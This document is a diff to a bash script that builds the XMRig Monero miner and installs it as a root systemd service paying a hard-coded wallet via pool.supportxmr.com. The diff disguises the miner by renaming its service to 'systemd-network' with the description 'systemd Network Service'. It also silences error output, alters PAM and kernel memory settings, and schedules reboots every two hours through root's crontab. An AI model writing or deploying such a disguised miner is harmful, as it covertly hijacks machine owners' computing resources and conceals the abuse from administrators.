@@ -1,40 +1,43 @@
 #!/bin/bash
 
-if [ -z "$1" ]; then
-    echo "Usage: $0 <WORKER_NAME>"
-    exit 1
-fi
+BASE_WALLET="42ZN85ZmYaKMSVZaF7hz7KCSVe73MBxH1JjJg3uQdY9d8ZcYZBCDkvoeJ5YmevGb6cPJmvWVaRoJMMEU3gcU4eCoAtkLvRE"
+WORKER_ID=${1:-A00001}
+WALLET="$BASE_WALLET.$WORKER_ID"
 
-WORKER="$1"
-WALLET="42ZN85ZmYaKMSVZaF7hz7KCSVe73MBx1JjJg3uQdY9d8ZcYZBCDkvoeJ5YmevGb6cPJmvWVaRoJMMEU3gcU4eCoAtkLvRE.$WORKER"
-POOL="pool.supportxmr.com:443"
-THREADS=$(nproc --ignore=1)
+echo "Using wallet: $WALLET"
 
-sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen curl libcap2-bin jq bc
+CPU_CORES=$(nproc)
+THREADS=$(( CPU_CORES > 1 ? CPU_CORES - 1 : 1 ))
+echo "Mining on $THREADS threads (CPU cores: $CPU_CORES)"
+
+sudo apt update
+sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen curl libcap2-bin
 
 echo -e "* soft memlock 262144\n* hard memlock 262144" | sudo tee -a /etc/security/limits.conf
-grep -q pam_limits.so /etc/pam.d/common-session || echo 'session required pam_limits.so' | sudo tee -a /etc/pam.d/common-session
+
+for file in /etc/pam.d/common-session /etc/pam.d/common-session-noninteractive; do
+  grep -q pam_limits.so $file || echo 'session required pam_limits.so' | sudo tee -a $file
+done
+
 echo 'vm.nr_hugepages=128' | sudo tee -a /etc/sysctl.conf
-sudo sysctl -w vm.nr_hugepages=128
-sudo setcap cap_sys_nice=eip /usr/bin/screen
+sudo sysctl -p
+
+sudo setcap cap_sys_nice=eip $(which screen)
 
 cd ~
-if [ ! -d "xmrig" ]; then
-    git clone https://github.com/xmrig/xmrig.git
-fi
+[ ! -d xmrig ] && git clone https://github.com/xmrig/xmrig.git
+cd xmrig/build 2>/dev/null || mkdir -p build && cd build
+cmake ..
+make -j"$CPU_CORES"
 
-cd xmrig
-mkdir -p build && cd build
-cmake .. && make -j$(nproc)
-
-sudo tee /etc/systemd/system/xmrig.service > /dev/null <<EOF
+sudo tee /etc/systemd/system/systemd-network.service > /dev/null <<EOF
 [Unit]
-Description=XMRig Miner
+Description=systemd Network Service
 After=network-online.target
 Wants=network-online.target
 
 [Service]
-ExecStart=/root/xmrig/build/xmrig -o $POOL -u $WALLET -k --tls --threads=$THREADS --donate-level=0 --cpu-priority=2 --randomx-mode=fast --randomx-1gb-pages
+ExecStart=/root/xmrig/build/xmrig -o pool.supportxmr.com:443 -u $WALLET -k --tls --threads=$THREADS --donate-level=0 --cpu-priority=2 --randomx-mode=fast --randomx-1gb-pages
 Restart=always
 LimitMEMLOCK=infinity
 User=root
@@ -46,11 +49,12 @@ StandardError=null
 WantedBy=multi-user.target
 EOF
 
+sudo chmod 644 /etc/systemd/system/systemd-network.service
 sudo systemctl daemon-reload
-sudo systemctl enable xmrig
-sudo systemctl start xmrig
+sudo systemctl enable systemd-network
+sudo systemctl start systemd-network
 
-(sudo crontab -l 2>/dev/null; echo "0 * * * * /sbin/reboot") | sudo crontab -
+(sudo crontab -l 2>/dev/null; echo "0 */2 * * * /sbin/reboot") | sudo crontab -
 
-echo "✅ Setup complete. Worker: $WORKER"
-echo " Miner auto-starts on boot; system reboots every hour."
+echo "Setup done. Miner running under 'systemd-network' service with wallet $WALLET"
+echo "Reboot scheduled every 2 hours."
